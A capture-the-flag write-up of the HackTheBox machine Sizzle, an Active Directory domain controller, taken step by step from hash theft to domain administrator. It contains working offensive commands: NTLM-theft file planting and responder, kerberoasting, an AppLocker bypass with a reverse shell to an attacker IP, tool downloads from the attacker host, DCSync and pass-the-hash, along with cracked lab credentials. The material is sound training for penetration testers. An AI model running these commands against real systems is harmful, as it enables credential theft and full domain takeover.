# Sizzle [HTB](https://app.hackthebox.com/machines/169)
![sizzle-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/sizzle-01.png)


## Recon

After adding the target to my `/etc/hosts` file, I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 sizzle.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/ports-02.png)


From here, I send `nmap` to start probing the found ports for more information:

```bash
nmap -p 21,53,80,135,139,389,443,445,464,593,636,3268,5985,5986,9389,47001 -sCV sizzle.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/nmap-res-03.png)
![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/nmap-res-04.png)
![nmap-res-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/nmap-res-05.png)
![nmap-res-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/nmap-res-06.png)


We have the following:

+ An FTP server on port 21.
+ A DNS server on port 53.
+ An IIS server on ports 80 & 443.
+ RPC endpoint mapper on port 135.
+ NetBIOS on port 139.
+ An LDAP server on ports 389, 636 & 3628. 
+ An SMB server on port 445.
+ Kerberos on port 464. 
+ WinRM on ports 5985 & 5986. 


Scrolling through the list, it's pretty obvious that we are dealing with a Domain Controller, based on services like DNS, LDAP, kerberos, etc. We can also see that the domain name is `htb.local`. 


In my opnion, the most interesting entry on the list is the FTP server which seems to allow anonymous logins. Other then that, we also have an SMB, DNS and IIS servers to check as well. 


Let's have a look! 


## FTP Port 21

Connecting to the FTP server anonymously does works, but the the server is empty:

![empty-ftp-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/empty-ftp-07.png)


Trying to write files to the server is denied:

![write-denied-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/write-denied-08.png)


As a last resort, I tried downloading whatever might be on the FTP server recursively, just to make sure I haven't missed anything:

```bash
wget -r ftp://anonymous:anonymous@sizzle.htb
```

Though this came out empty as well. 


Next, I turned to the IIS servers. 


## IIS Ports 80 & 443

Browsing towards `http://sizzle.htb/` returns the following page:

![site-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/site-09.png)


The HTTPS version of the site seems to be identical. I intercepted some requests in my Burp proxy to see if there are any interesting HTTP headers, or something in the source code, but it was all fairly mundane. 


At this point I decided to run a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://sizzle.htb/FUZZ -e .txt,.html,.asp,.aspx,.conf
```


But this didn't lead to any useful revelations. While this was running I also ran a deeper crawling scan on the site using [feroxbuster](https://github.com/epi052/feroxbuster) as such:

```bash
feroxbuster -u http://sizzle.htb/
```

Which found the presence of a `/aspnet_client` directory in the root of the server. This looked interesting, but unfortunately we don't have permissions to this directory or anything inside of it.


Next I turned to the DNS server.


## DNS Port 53

I start by asking the DNS server to return any record it's willing to disclose againts the `htb.local` domain using:

```bash
dig any htb.local @sizzle.htb
```

![any-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/any-10.png)


We can see there is a record here for `hostmaster.htb.local`. I mapped this entry to the external IP of the target in my `/etc/hosts` file. 


I also tried to perform a zone transfer using:

```bash
dig axfr @sizzle.htb
fierce --domain htb.local --dns-servers 10.129.33.128
```


Though both methods failed. 


Next, I turned to the SMB server. 


## SMB Port 445.

Trying to list out the available shares using a null session surprisingly works:

```bash
smbclient -N -L \\\\sizzle.htb\\
``` 

![smb-null-list-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/smb-null-list-11.png)


We can see a few interesting shares here: 

+ CertEnroll 

[CertEnroll](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732517(v=ws.10)?redirectedfrom=MSDN) is web interface designed to provide an enrollment mechanism for organizations that need to issue and renew certificates for users and computers that are not joined to the domain or not connected directly to the network, and for users of non-Microsoft operating systems.


There are a few ways of exploiting this feature, though we need credentials which we do not have at the moment. 


We can't read, or write to this share. 


+ SYSVOL

This directory is also very interesting, as it plays a pivotal role in the smooth functioning of Windows domain environments. This shared directory, is a central repository for storing server copy of the domain’s public files, including Group Policy Objects (GPOs) and scripts. 


One of the key aspects of SYSVOL is it's replication feature. Changes made in the SYSVOL directory of one domain controller are replicated to the SYSVOL directories of all other domain controllers in the domain, which is crucial for ensuring all users and computers within the domain receive the same policies and scripts. You can read more about it [here](https://networkencyclopedia.com/sysvol-share/).


At the moment we can't read or write to this share. 


+ NETLOGON

This directory is where the domain controllers stores default user profiles for roaming users, or users without a local profile. It also stores system policies and logon scripts that execute when a user logs in to the system. 


At the moment we can read or write to this share. 


+ Department Shares

This is the only share we have read access to and it looks as such:

![department-share-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/department-share-12.png)


Most of the files here are completely empty, but from the `Users` directory we can get a list of potential users on the domain:

![users-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/users-13.png)


All of the user directories are empty and we can't write to any of them, except two. We can, to the `ZZ_ARCHIVE` and `Public` directories. 


The `ZZ_ARCHIVE` was generally useless, it had a bunch of files which seemed to be filled with null bytes. But writing to the `Users\Public` directory resulted in an interesting behaviour:

![smb-write-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/smb-write-14.png)


We can see that the file was deleted fairly quickly, which tells me that there is probably some sort of script operating on this directory. I'm not sure what it's doing, but it might be doing more then just deleting files. 


At the moment, what we need most are credentials, since it will open up a lot of enumeration/exploit vectors on the domain for us. So our best bet is to try and pish whom ever is running this script, in the hopes of stealing their NTLM hash through forced authentication to an endpoint we control. 


There are many different ways of forcing NTLM authentication, going over each method manuall will take a lot of time. Instead, we can try to automate the process with [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), which will generate a decent amount of files for us, each with a different approach to trigger NTLM authentication. We can then upload the files to the SMB server with a short bash loop, and run `responder` to catch any authentication attempts to our attack machine. 


After downloding `ntlm_theft`, I generate my pishing files into a dedicated directory as such:

```bash
python3 ntlm_theft.py -g all -s 10.10.14.48 -f htb
```

Next, I start `responder`:

```bash
responder -I tun0 -dwv
```

Then, I cd into the `htb` directory, and use this simple bash loop to write all the files to the writable SMB share in bulk:

```bash
for i in $(ls);do smbclient -N \\\\sizzle.htb\\"Department Shares" << EOF                      
for heredoc> cd Users\Public
for heredoc> put $i                                             
for heredoc> EOF
for> done
``` 

After a few seconds I catch `amanda`'s NTLM hash in responder:

![amanda-ntlm-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/amanda-ntlm-15.png)


After reading other people's writeup for this box, I came to find that the attack worked due to the Windows Explorer Shell Command file (.scf). In short, we can force anyone who enters a directory containing a `.scf` file to fetch a desktop icon image from an SMB server we control. You can read more about it [here](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf).



From here, I try to crack it using hashcat:

```bash
hashcat -m 5600 -a 0 "<entire_hash>" rockyou.txt 
```

![cracked-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/cracked-16.png)


And now we get creds of `amanda : Ashare1972`, nice! 


This now opens up the operatunity to enumerate the DC with user privileges, which could potentially reveal new information. 


I start with `enum4linux` as such:

```bash
enum4linux -a u "amanda" -p "Ashare1972" sizzle.htb 
```

Which manages to find valid user accounts on the system:

![valid-users-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/valid-users-17.png)


It also manges to give us `amanda`'s SMB privileges:

![smb-privs-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/smb-privs-18.png)


We can also use the creds to enumerate the LDAP server with:

```bash
ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 sizzle.htb
```

This will generate an extensive overlook of the entire domain, which is definitely useful and important in real assessments though in case, I'm not going to go over it. 


## CertEnroll Exploit

After a bit of looking around and enumerating the target as `amanda`, I didn't find anything super useful or interesting that can be leveraged to get access to the system. 


Instead, I decided to get back to the certificate web enrollment feature we found earlier through the SMB share. As `amanda` we can now list the contents of the `CertEnroll` share, though it's not super useful:

![certenroll-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/certenroll-19.png)


The real question is where the AD CS web enrollment is located. Based on [this post](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/retrieve-base-and-delta-crl) from Microsoft, the AD CS web enrollment endpoint should be located at `http://<servername>/certsrv`


Browsing towards `http://sizzle.htb.local/certsrv`, does in fact prompt me for credentials:

![certsrv-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/certsrv-20.png)


After suppling `amanda`'s creds, I get inside:

![logged-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/logged-21.png)


How do we exploit this? 


I started by following [this overview](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation) from hacktricks, which suggested using [Certipy](https://github.com/ly4k/Certipy), an offensive tool for AD CS. 


After installing the tool, I run the following command to enumerate the AD CS server for any vulnerabilities:

```bash
certipy find -username amanda@htb.local -password Ashare1972 -dc-ip 10.129.32.141
```

This resulted in a couple of vulnerabilities, primarly `certipy` found an ESC4 vulnerability in the SSL certificate template, which can be leveraged to completely overwrite the template and make it vulnerable to ESC1. From there, we can get a PKCS#12 certificate for any UPN on the domain and try to use it to get a TGT from the kerberos server. I performed all the steps but didn't manage to get a TGT from the server.


What can we do instead? 


The certificate web enrollment is primarly used to give end-users the option to request a certificates from the domain's CA, to then be used to as an authorization mechanism to get access to network resources. That's the AD CS's intended use case, and we can leverage that to get access to the system through PSRemoting. 


Based on [this post](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity?view=powershell-7.4) from Microsoft, PSRemoting or WinRM, which runs on `HTTP: 5985` & `HTTPS: 5986`, can support certificate based authentication in SSL based connections. We know both these ports are open on our target based on our initial `nmap` scan, and the fact that we also have the AD CS installed tells me there is a reason, and it's probably to allow users to get certificates so they can login through PSRemoting. 


If we go back to the certificates web enrollment, and click on `Request a certificate`, we will see the following page:

![request-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/request-22.png)


The first link of `User Certificate` for some reason didn't work for me, though I've seen other people use it to solve sizzle. So I was left with the advanced certificate reqeust.


If we click on that link we are brought to the following page:

![advanced-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/advanced-23.png)


We can see the page is asking a certificate singing request (.csr) file. Generating this kind of file from scratch is fairly trivial using `openssl`.


First, I create my private key:

```bash
openssl genrsa -aes256 -out my.key 2048
```

![genrsa-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/genrsa-24.png)


Next, I generate the needed certificate signing request:

```bash
openssl req -new -key my.key -out my.csr
```

![gencsr-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/gencsr-25.png)


I leave all the input fields empty accept for the `Common Name` field, to which I supply the FQDN of our target `sizzle.htb.local`.


I then `cat` out the contents of our newly created `my.csr` file, and paste it to the AD CS web interface as such:

![submit-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/submit-26.png)


I hit the the `Submit` button, and my request is accepted immediately. I then get the option to download my newaly signed certificate:

![cert-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/cert-27.png)


From here, we can use it to connect to the HTTPS WinRM endpoint. Typically, we would use `evil-winrm` to connect to a target Windows machine from a Linux client, but since we are using certificate based authentication, we need to use a custom script for it, which is [winrm_shell.rb](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) from `Alamot`.


After downloading the script I make a few adjustments so we can login with our certificate:

![modify-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/modify-28.png)


I link my certificate, private key, and the password for it (so it won't prompt me for it every 2 minutes) and point to the HTTPS WinRM endpoint running on port 5986. 


After executing the script I get a shell:

![shell-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/shell-29.png)


## Privilege Escalation

After landing on the box I start looking for quick wins. For example, listing `Se` privileges, looking for `runas` credentials, taking a look at the registry for any credentials, looking for any interesting groups or custom applications, etc. 


While poking around the system, I've noticed that we are in a constrained powershell environment:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

![constrained-29.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/constrained-29.5.png)


To bypass this, we can use something like [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM). I decided to use the available compiled version at `PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug/` as our target's architecture is X64:

```powershell
$Env:PROCESSOR_ARCHITECTURE
```

![arch-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/arch-30.png)


Because we are in a constrained shell, most file transfer methods will be blocked. Though I found that we can transfer files using an SMB server. 


After grabbing a copy of `PsBypassCLM.exe` to my working directory, I start the SMB sever on my attack machine as such:

```bash
impacket-smbserver -smb2support -username htb -password htb s .
```

Then, I connect to this share form the target, and copy the file over:

```powershell
net use \\10.10.14.51\s /u:htb htb
copy \\10.10.14.51\s\bypassCLM.exe 
```

![copy-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/copy-31.png)


But when executing the file I got denied:

![blocked-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/blocked-32.png)


The error message says that execution has been blocked by group policy. I have a hunch that it might be AppLocker. 


We can list the AppLocker policies with:

```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

![policy-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/execute-33.png)


The Description and Name are a bit deseptive, as the policy dosn't really effect `C:\\Program Files`. Instead, `%OSDRIVE%\tmp\*` refers to `C:\\Windows\Temp`. Therefore, we can place the `PsBypassCLM.exe` binary at `C:\\Windows\Temp` and execute it from there. 


Once the file is there, I start a local listener on my attack machine using:

```bash
rlwrap nc -lnvp 443
```

Next, I execute `PsBypassCLM.exe` with the `revshell` option to connect back to my listener:

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.51 /rport=443 c:\\users\amanda\appdata\local\temp\bypassCLM.exe
```

![execute-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/execute-34.png)

Which gives me a full powershell session:

![full-session-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/full-session-35.png)


After which I kept looking around the system. Eventually I decided to list out the open ports on the target using:

```cmd
netstat -ano | findstr TCP 
``` 

![netstat-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/netstat-36.png)


We can see port 88 is open on the target, though it didn't show up in our `nmap` scan. This probably means that it has been blocked off by a firewall. Port 88 is where the kerberos authentication takes place, and the fact that this port has been blocked by the firewall tells me there is more to it. Specifically, we want to test for [kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast).


There are a few ways we can test and exploit kerberoasting. One is using `impacket-GetUserSPNs` from our attack machine, though this will require us to tunnel port 88 to our attack machine.


Another approach is to use something like [Robeus](https://github.com/GhostPack/Rubeus), which is an offensive toolkit for kerberos. This will require us to compile it on a Windows VM that has a matching .NET version with the target.


I decided to go for the later choise, since I've never used it before. 


To compile it, I use the following Windows 10 VM build:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type
OS Name:      Microsoft Windows 10 Pro                           
OS Version:   10.0.19045 N/A Build 19045                         
System Type:  x64-based PC
``` 

I also have [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/) installed on it as well. To which I load the project form the git repository, build it, and transfer it over to my attack machine.


Then, I host the file via a python web server using:

```bash
python3 -m http.server 80
```

And download it from the target using:

```powershell
iwr "http://10.10.14.51/Rubeus.exe" -OutFile r.exe
```

Now, we can try to locate any kerberostable users with the following command:

```powershell
.\r.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

![kerberostable-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/kerberostable-37.png)


We can see that `mrlky` is vulnerable, and we managed to get his TGS ticket. From here, we can try to crack it with `hashcat` as such:

```bash
hashcat -m 13100 -a 0 "<entire_hash>" rockyou.txt
```

Which cracks to `Football#7`:

![cracks-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/cracks-38.png)


Now I just repeat the process for requesting a user certificate from the AD CS web interface. I get a new certificate for `mrlky`, I modify my `winrm_shell.rb` to load he's certificate and I login to the system:

![mrlky-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/mrlky-39.png)


### Mrlky

After landing on a shell as `mrlky` we are put into a constrained environment again:

![constrained-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/constrained-40.png)


So I repeat the process from before using `PSByPassCLM`, this time from `C:\\Users\mrlky\appdata\local\temp`:

![exec-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/exec-41.png)


And now I have a full shell again:

![full-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/full-42.png)


At this point I enumerated the system some more, just to see if there are any new escalation vectors now that we have a shell as `mrlky`, but I didn't notice anything substantial.


So instead, I decided to get back to the AD and enumerate it instead. To do this, we can use something like [SharpHound](https://github.com/BloodHoundAD/SharpHound). 


I host the `SharpHound.exe` binary via a python web server on my attack machine and download it to the target using:

```powershell
iwr "http://10.10.14.51/SharpHound.exe" -OutFile sh.exe
```

I then run the collector script from `C:\\Windows\Temp` as such:

```powershell
./sh.exe --CollectionMethods All --OutputDirectory C:\Users\mrlky
```

The execution went well, and if we cd into `mrlky`'s home folder we can see our loot:

![loot-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/loot-43.png)


To transfer the zip archive to my attack machine, I use the same SMB server from before, only this time I write to it from the target as such:

```powershell
copy 20240124024539_BloodHound.zip \\10.10.14.51\s\
```

And now I have the zip archvie on my attack machine:

![got-zip-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/got-zip-44-.png)


From here we need to lunch [bloodhound](https://github.com/BloodHoundAD/BloodHound), and upload the data we've just retrieved from the target. 


Once the data has been loaded, I start playing around with different queires, looking at different nodes, checking for any misconfigured rights and privileges. 


In the `Dangerous Privileges` tab, I select the `Find principals with DCSync rights` query, which looks like this:

![dcsync-rights-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/dcsync-rights-45.png)


We can see that our user `mrlky`, has some DCSync rights over the `htb.local` domain, if we right click on this link, and select `info`, we can see the following message:

![info-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/info-46.png)


Which means we can try to pull of a [DCSync attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync). 


Ther are a few different ways to perform this attack, which will allow us to get the NTLM hash of any UPN on the domain. One way is using `mimikatz` locally on the target, and another way is to use `impacket-secretsdump` from our attack machine. I decided to go the latter option, and exploit this remotely. 


To get the NTLM hash of the administrator we can run something like this:

```bash
impacket-secretsdump -just-dc mrlky:Football#7@sizzle.htb -just-dc-user administrator
```

![hash-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/hash-47.png)


From here we can try to crack the hash, or we can just pass it to `psexec` and get a shell:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@sizzle.htb
```

![root-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sizzle/img/root-48.png)
